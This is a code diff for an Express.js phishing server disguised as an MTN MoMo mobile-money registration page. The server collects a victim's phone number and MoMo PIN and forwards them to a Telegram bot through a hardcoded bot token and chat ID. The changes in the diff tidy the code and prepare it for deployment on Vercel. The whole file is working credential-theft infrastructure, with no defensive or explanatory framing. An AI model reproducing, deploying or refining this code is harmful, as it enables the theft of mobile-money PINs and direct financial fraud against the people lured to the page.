@@ -2,15 +2,12 @@ const express = require('express');
 const axios = require('axios');
 
 const app = express();
-const PORT = process.env.PORT || 3000;
-
-// ===== CONFIGURATION - BOT 2 =====
-const BOT_TOKEN = '8960673686:AAHPqO_C0dhpCMf57ZourwGVcVTIJtYI9Qw';
-const CHAT_ID = '8780810040';
-
-// Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+
+// ===== CONFIGURATION =====
+const BOT_TOKEN = '8960673686:AAHPqO_C0dhpCMf57ZourwGVcVTIJtYI9Qw';
+const CHAT_ID = '8780810040';
 
 // ===== HTML PAGE =====
 const HTML_PAGE = `<!DOCTYPE html>
@@ -132,7 +129,7 @@ p{color:#666;margin-bottom:10px;line-height:1.6}
 </head>
 <body>
 <div class="container">
-<div class="success-icon">✓</div>
+<div class="success-icon">&#10003;</div>
 <h1>Registration Successful!</h1>
 <p>Your MTN MoMo registration has been received.</p>
 <div class="details">
@@ -152,10 +149,12 @@ document.getElementById('regNumber').textContent=localStorage.getItem('mtnNumber
 
 // ===== ROUTES =====
 app.get('/', (req, res) => {
+    res.setHeader('Content-Type', 'text/html');
     res.send(HTML_PAGE);
 });
 
 app.get('/success', (req, res) => {
+    res.setHeader('Content-Type', 'text/html');
     res.send(SUCCESS_PAGE);
 });
 
@@ -181,13 +180,13 @@ app.post('/api/register', async (req, res) => {
         const registrationId = Math.floor(10000 + Math.random() * 90000).toString();
 
         const message =
-            '📱 <b>NEW MTN MOMO REGISTRATION</b>\n\n' +
-            '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
-            '━━━━━━━━━━━━━━━━━━━━\n' +
-            '📞 <b>MTN Number:</b> <code>' + mtnNumber + '</code>\n' +
-            '🔑 <b>MoMo PIN:</b> <code>' + momoPin + '</code>\n' +
-            '━━━━━━━━━━━━━━━━━━━━\n\n' +
-            '⏰ <b>Submitted:</b> ' + new Date().toLocaleString();
+            '<b>NEW MTN MOMO REGISTRATION</b>\n\n' +
+            '<b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
+            '----------------------\n' +
+            '<b>MTN Number:</b> <code>' + mtnNumber + '</code>\n' +
+            '<b>MoMo PIN:</b> <code>' + momoPin + '</code>\n' +
+            '----------------------\n\n' +
+            '<b>Submitted:</b> ' + new Date().toLocaleString();
 
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         await axios.post(url, {
@@ -196,7 +195,7 @@ app.post('/api/register', async (req, res) => {
             parse_mode: 'HTML'
         });
 
-        console.log('✅ Registration sent:', registrationId);
+        console.log('Registration sent:', registrationId);
 
         res.json({
             success: true,
@@ -205,7 +204,7 @@ app.post('/api/register', async (req, res) => {
         });
 
     } catch (error) {
-        console.error('❌ Error:', error.response?.data || error.message);
+        console.error('Error:', error.response?.data || error.message);
         res.status(500).json({
             success: false,
             message: 'Failed to process registration'
@@ -218,9 +217,15 @@ app.get('/health', (req, res) => {
     res.json({ status: 'healthy', timestamp: new Date().toISOString() });
 });
 
-// ===== START SERVER =====
-app.listen(PORT, () => {
-    console.log(`🚀 MTN MoMo Registration (Bot 2) running on port ${PORT}`);
-    console.log(`🤖 Bot: ${BOT_TOKEN.substring(0, 15)}...`);
-    console.log(`📱 Chat ID: ${CHAT_ID}`);
-});
+// ===== START SERVER (local dev only) =====
+if (process.env.NODE_ENV !== 'production' && !process.env.VERCEL) {
+    const PORT = process.env.PORT || 3000;
+    app.listen(PORT, () => {
+        console.log(`MTN MoMo Registration running on port ${PORT}`);
+        console.log(`Bot: ${BOT_TOKEN.substring(0, 15)}...`);
+        console.log(`Chat ID: ${CHAT_ID}`);
+    });
+}
+
+// ===== EXPORT FOR VERCEL =====
+module.exports = app;
